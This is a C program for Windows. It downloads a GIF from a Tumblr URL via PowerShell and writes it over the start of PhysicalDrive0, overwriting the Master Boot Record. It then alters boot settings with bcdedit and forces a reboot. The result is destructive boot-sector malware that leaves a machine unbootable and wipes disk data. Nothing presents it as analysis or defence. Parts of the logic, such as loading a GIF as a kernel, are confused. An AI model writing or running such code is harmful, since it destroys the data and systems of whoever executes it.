#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <winioctl.h>

#define GIF_URL "https://64.media.tumblr.com/acda81d74755683b00252baddbc9efb9/c94dfc5c1b3959c9-d3/s540x810/928b2b8c517da84965873e7a17bff6400102f897.gifv"
#define GIF_FILE "boot.gif"

int main() {
    // Download the GIF file
    const char* command = "powershell -command \"Invoke-WebRequest -Uri " GIF_URL " -OutFile " GIF_FILE "\"";
    system(command);

    // Open the Master Boot Record device
    HANDLE hDevice = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("Error opening the device.\n");
        return 1;
    }

    // Write the GIF file to the Master Boot Record
    FILE* gifFile = fopen(GIF_FILE, "rb");
    if (!gifFile) {
        printf("Error opening the GIF file.\n");
        CloseHandle(hDevice);
        return 1;
    }

    BYTE buffer[512];
    DWORD bytesRead;
    while (fread(buffer, sizeof(BYTE), sizeof(buffer), gifFile) == sizeof(buffer)) {
        if (!DeviceIoControl(hDevice, FSCTL_LOCK_VOLUME, NULL, 0, NULL, 0, &bytesRead, NULL)) {
            printf("Error locking the volume.\n");
            fclose(gifFile);
            CloseHandle(hDevice);
            return 1;
        }

        if (!WriteFile(hDevice, buffer, sizeof(buffer), &bytesRead, NULL)) {
            printf("Error writing to the device.\n");
            fclose(gifFile);
            CloseHandle(hDevice);
            return 1;
        }

        if (!DeviceIoControl(hDevice, FSCTL_UNLOCK_VOLUME, NULL, 0, NULL, 0, &bytesRead, NULL)) {
            printf("Error unlocking the volume.\n");
            fclose(gifFile);
            CloseHandle(hDevice);
            return 1;
        }
    }

    fclose(gifFile);
    CloseHandle(hDevice);

    // Modify the boot entry to display the boot menu and load the GIF as kernel
    system("bcdedit /set {bootmgr} displaybootmenu yes");
    char bootEntryOption[512];
    snprintf(bootEntryOption, sizeof(bootEntryOption), "bcdedit /set {%s} kernel %s", "{current}", GIF_FILE);
    system(bootEntryOption);

    // Reboot the computer
    ExitWindowsEx(EWX_REBOOT, 0);
    
    return 0;
}
